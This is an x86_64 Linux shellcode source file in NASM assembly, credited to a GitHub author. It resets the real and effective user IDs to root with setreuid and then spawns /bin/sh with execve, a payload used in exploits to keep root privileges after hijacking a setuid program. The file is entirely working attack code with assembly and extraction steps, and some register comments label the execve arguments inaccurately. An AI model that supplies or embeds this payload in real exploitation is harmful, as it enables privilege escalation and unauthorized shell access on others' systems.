; lnx-execve-setreuid-x86_64.s
; Linux EXECVE(2) + SETREUID(2) shellcode for x86_64 instruction set.
; Programs automatically drops privileges, unless SETREUID(0) syscall is used.
; Written by e3prom (github.com/e3prom)
;
; nasm -f elf64 lnx-execve-setreuid-x86_64.s
; ld lnx-execve-setreuid-x86_64.o -o lnx-execve-setreuid-x86_64
; objdump -d lnx-execve-setreuid-x86_64
BITS 64

section .text
  global _start

  _start:
    ; SETREUID(2) - setreuid  - set real and/or effective user ID
    ;               int setreuid(uid_t ruid, uid_t euid);
    xor eax, eax			; Zero out RAX.
    mov rdi, rax			; Zero out RDI from RAX.
    mov rsi, rax			; Zero out RSI from RAX.
    mov rdx, rax			; Zero out RDX from RAX.
    mov al, 0x71  			; Set RAX (low-order 8bits) to 0x71 (/usr/include/asm/unistd_64.h:117).
    syscall				; Perform system call.

    ; EXECVE(2) - execute program
    ;             int execve(const char *filename, char *const argv[], char *const envp[]);
    xor eax, eax			; Zero out RAX (XOR EAX here is enough on 64-bits).
    push rax				; Push RAX onto the stack - or null register.
    mov qword rbx, 0x68732f2f6e69622f	; Move into RBX the qword of the filename - python: '/bin//sh'[::-1].encode('hex').
    push rbx				; Push RBX into the stack.
    mov rdi, rsp			; Move RSP to RDI (argv1) to point to the top of the stack where the filename has been pushed.
    push rax				; Push RAX onto the stack, RAX is zero, so the null register at that position.
    mov rsi, rsp			; Move RSP to RSI (argv2) to point to the top of the stack where the pushed null register is.
    push rdi				; Push the value of RDI which is the memory address of the filename onto the stack.
    mov rdx, rsp			; Move RSP to RDX (argv3) to point to the top of the stack where the filename's memory address pushed is.
    mov al, 0x3b			; Move '0x3b' to AL/EAX/RAX (execve syscall number).
    syscall				; Peform system call.
